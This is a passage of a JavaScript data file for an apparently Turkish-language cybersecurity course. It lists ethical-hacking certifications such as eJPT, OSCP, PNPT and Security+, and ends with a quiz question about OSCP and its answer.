    sections: [
      {
        heading: "1. Etik Hacker ve Pentester Sertifikasyon Rehberi",
        content: `Sektörde en çok değer gören pratik sınavlar:
- **eJPT:** Sektöre ilk giriş için en iyi pratik sınavdır. 48 saatlik mini sızma testi içerir.
- **OSCP:** Endüstrinin altın standardıdır. 24 saatlik canlı sızma testi ve raporlama gerektirir.
- **PNPT:** Gerçek hayat OSINT ve Active Directory odaklı pratik sertifikasyon.
- **CompTIA Security+:** Kurumsal temel ve teorik altyapı için dünya çapında geçerli başlangıç sertifikası.`
      }
    ],
    quiz: {
      question: "24 saatlik uygulamalı laboratuvar ortamında sunucuları hackleyip ardından profesyonel pentest raporu yazmayı zorunlu kılan ünlü etik hacker sertifikası hangisidir?",
      options: [
        "OSCP (Offensive Security)",
        "CEH (Theoretical Exam)",
        "ITIL Foundation",
        "CCNA Routing"
      ],
      correct: 0,
      explanation: "OSCP, 24 saat kesintisiz pratik sızma testi ve sonrasında 24 saatlik detaylı raporlama süresiyle sektördeki en saygın hands-on etik hackerlık sertifikasıdır."
    }
  }
];

if (typeof module !== "undefined" && module.exports) {
  module.exports = { CURRICULUM_DATA };
}
